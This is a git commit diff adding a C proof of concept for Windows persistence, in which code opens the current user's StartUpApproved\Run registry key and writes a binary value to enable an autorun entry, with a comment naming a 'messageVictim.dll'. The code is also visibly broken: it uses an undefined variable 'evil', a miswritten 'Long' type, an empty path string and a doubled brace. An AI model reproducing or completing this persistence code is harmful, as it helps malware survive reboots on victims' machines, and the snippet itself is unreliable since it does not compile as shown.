3d205ec7d27caf297d7abb708dc3953f11817158
onisodanielosah <onisodanielosah@gmail.com>
2024-11-26 06:15:15 +0000

    Create PoC to set registry entry

--- PersistenceApproved.c
+++ PersistenceApproved.c
@@ -8,4 +8,19 @@ Windows persistence via StartUpApproved
 int main(int argc, char* argv[]) {
     HKEY hkey = NULL;
     BYTE data[] = {{0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+
+    const char* path = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartUpApproved\\Run";
+    // might need a function to get the location of messageVictim.dll
+    const char* persApp = "";
+    
+    Long res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR) path, 0, KEY_WRITE, &hkey);
+    printf (res != ERROR_SUCCESS ? "failed to open registry key :(\n" : "successfully opened registry key:)\n");
+
+// Suggested code may be subject to a license. Learn more: ~LicenseLog:824261827.
+    res = RegSetValueEx(hkey, (LPCSTR)evil, 0, REG_BINARY, data, sizeof(data));
+    printf (res != ERROR_SUCCESS ? "failed to set registry value :(\n" : "successfully set registry value:)\n");
+// close registry key
+    res = RegCloseKey(hkey);
+
+    return 0;
 }
